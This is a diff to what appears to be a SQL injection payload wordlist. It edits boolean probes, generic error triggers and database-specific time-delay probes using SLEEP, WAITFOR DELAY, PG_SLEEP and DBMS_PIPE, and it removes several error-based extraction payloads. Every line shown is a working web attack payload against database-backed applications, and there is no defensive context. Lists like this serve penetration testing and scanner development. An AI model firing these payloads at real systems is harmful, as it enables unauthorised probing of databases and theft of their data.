@@ -28,19 +28,14 @@
 1' AND 1=1--
 1' AND 1=2--
 
-# --- Error triggers (generic) ---
+# --- Generic error triggers ---
 '||'
 '+'
-' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
-' AND 1=CONVERT(int,@@version)--
-' AND 1=(SELECT 1 FROM DUAL WHERE 1=1)--
 
-# --- Time probes (generic, short delay) ---
+# --- Time probes (DB-specific — try each, only one will work per target) ---
 ' AND SLEEP(3)--
-' AND SLEEP(3)='
 '; WAITFOR DELAY '0:0:3'--
 ' OR PG_SLEEP(3)--
-' AND 1=(SELECT 1 FROM (SELECT SLEEP(3))a)--
 '||(SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),3) FROM DUAL)||'
 
 # --- Stacked query probes ---
